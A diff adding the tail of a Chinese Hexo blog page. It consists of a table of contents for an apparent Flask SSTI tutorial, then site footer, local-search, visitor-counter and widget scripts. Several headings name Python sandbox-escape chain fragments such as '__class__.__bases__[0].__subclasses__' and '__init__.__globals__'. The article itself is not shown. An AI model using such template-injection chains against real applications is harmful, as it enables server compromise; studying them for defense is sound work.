class="nav-text">1.1.().xxx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-class"><span class="nav-number">3.4.3.</span> <span class="nav-text">1.2. ().__class__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-class-bases-0"><span class="nav-number">3.4.4.</span> <span class="nav-text">1.3. ().__class__.__bases__[0]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-4-class-bases-0-subclasses-40"><span class="nav-number">3.4.5.</span> <span class="nav-text">1.4.().__class__.__bases__[0].()__subclasses__[40]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-Python-的内建函数"><span class="nav-number">3.4.6.</span> <span class="nav-text">1.5 Python 的内建函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常见payload2"><span class="nav-number">3.4.7.</span> <span class="nav-text">常见payload2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1"><span class="nav-number">3.4.8.</span> <span class="nav-text">2.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-init-globals"><span class="nav-number">3.4.9.</span> <span class="nav-text">2.2 __init__.__globals__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3"><span class="nav-number">3.4.10.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4"><span class="nav-number">3.4.11.</span> <span class="nav-text">4</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例题2"><span class="nav-number">3.5.</span> <span class="nav-text">例题2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSTI-in-Flask"><span class="nav-number">3.5.1.</span> <span class="nav-text">SSTI in Flask</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'true') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("otYDWvApXTYxWRiyvbntKaiI-gzGzoHsz#<app_id>", "BGOUX1v4oeMfXIDWyV4dxdUt#<app_key>");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
